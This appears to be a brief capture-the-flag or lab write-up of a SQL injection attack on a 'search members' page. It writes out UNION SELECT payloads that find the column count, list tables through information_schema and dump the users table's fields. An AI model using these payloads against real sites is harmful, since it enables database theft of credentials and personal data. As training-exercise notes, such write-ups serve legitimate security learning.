in the search members page, we've tried the generic union select payloads from this link https://github.com/payloadbox/sql-injection-payload-list
using this input "5 UNION ALL SELECT 1" we had incorrect number of columns message, so we have tried this "5 UNION ALL SELECT 1,2"
we used the information schema and the cancatanate cmd following this input 5 UNION SELECT 1, CONCAT(table_name,1000001,column_name) FROM information_schema.columns, we found table called users, and it has (username,password,user_id,first_name,last_name,town, country,planet), using this command to get all values....5 UNION SELECT 1, CONCAT(user_id,first_name,last_name,town,country,planet,Commentaire,countersign) from users, this has been shown

ID: 5 UNION SELECT 1, CONCAT(user_id,first_name,last_name,town,country,planet,Commentaire,countersign) from users
